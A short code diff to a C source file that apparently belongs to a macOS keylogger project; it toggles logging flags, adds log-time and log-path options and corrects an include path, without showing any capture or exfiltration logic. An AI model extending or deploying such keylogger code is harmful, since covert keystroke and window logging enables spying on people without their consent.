@@ -1,6 +1,8 @@
 /**********************************/
-#define WRITE_LOG_FILE          true
+#define WRITE_LOG_FILE          false
 #define DELETE_DATABASE_FILE    false
+#define LOG_TIME_ENABLED        false
+#define LOG_PATH_ENABLED        true
 /**********************************/
 #include "../include/keylogger.h"
 #include "../src/includes.c"
@@ -13,7 +15,7 @@
 //#include "webserver.c"
 #include "window_utils.c"
 /**********************************/
-#include "types.h"
+#include "../include/types.h"
 /**********************************/
 CFArrayRef windowList;
 volatile unsigned int windows_qty = 0;
